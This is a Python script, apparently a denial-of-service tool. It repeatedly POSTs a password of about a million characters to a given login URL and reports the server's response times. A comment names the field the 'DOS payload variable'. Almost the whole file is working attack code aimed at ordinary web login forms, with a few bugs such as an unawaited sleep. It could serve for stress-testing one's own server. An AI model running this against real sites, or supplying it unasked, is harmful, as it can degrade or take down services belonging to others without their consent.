import sys, argparse
import asyncio
import aiohttp
import time
from hurry.filesize import filesize

# Use argparse to get command line options
# @todo Clean this up
parser = argparse.ArgumentParser(description='Description here')
parser.add_argument('-u', '--url', dest='url', type=str, required=True,help='url')
parser.add_argument('-l', '--login', dest='login', type=str, required=True,help='login')
parser.add_argument('-s', '--size', dest='size', type=int, default=1000000, help='Size of the password')
parser.add_argument('-d','--delay', dest='delay', type=float, default=1, help='Time between requests in seconds')
parser.add_argument('-r','--repeats', dest='repeats', type=int, default=20, help='Number of iterations')

# Set command line options to a object
args = parser.parse_args()

# A global counter variable for iterations, used in progress display
iterations = 0

async def makeRequest(url, payload, delay):
    """
    Make an asynchronous POST request

    @type url: str
    @param url: Url to test
    @type payload: dict
    @param payload: Dictionary of POST variables
    @type delay: float
    @param delay: Delay between each request in seconds
    @rtype: None
    @return:
    """

    global iterations

    # Measure time
    start = time.time()

    # The actual request
    response = await aiohttp.post(url, data = payload)

    # Add to iteration counter
    iterations += 1

    # Request response time
    duration = time.time() - start

    # Display the progress using this callback
    response_callback(duration, iterations)

    # Close the connection
    response.close()

    # Wait for a given time
    asyncio.sleep(delay)

def response_callback(duration, count):
    """
    Prints the progress meter in stdout

    @type duration: float
    @param duration:
    @type count: int
    @param count: A number of iterations
    @rtype: None
    @return:
    """
    # @todo Make this multiline
    sys.stdout.write("\r" + str(round((count / args.repeats) * 100, 2)) + "% done - server response time " + str(round(duration, 2)) + " seconds.")

def main():
    """
    Main program

    @return:
    """

    # Generate password
    # @todo Generate the password from random characters
    sys.stdout.write("Generating password...\n")
    password = "x" * args.size
    sys.stdout.write("Done!\n")

    # Set the POST payload
    # @todo Add POST variables from the command line argument, ie. --variables username,email,login
    # @todo Add an ability to set a custom variable name for the "password" DOS payload variable
    payload = { 'login': args.login, 'password': password }

    # Initialize a task list
    tasks = list()

    # Print the summary of the assigment
    # @todo Add url and ask for comfirmation
    sys.stdout.write("Sending " + str(args.repeats) + " passwords sized " + filesize.size(args.size) + " in every " + str(args.delay) + " seconds.\n")

    # Add requests to the task list
    for i in range(args.repeats):
            tasks.append(makeRequest(args.url, payload, args.delay))

    # Event loop that waits for tasks to complete
    loop = asyncio.get_event_loop()

    # Run the loop until every task is complete
    loop.run_until_complete(asyncio.wait(tasks))

    # Close the loop
    loop.close()

if __name__ == '__main__':
    main()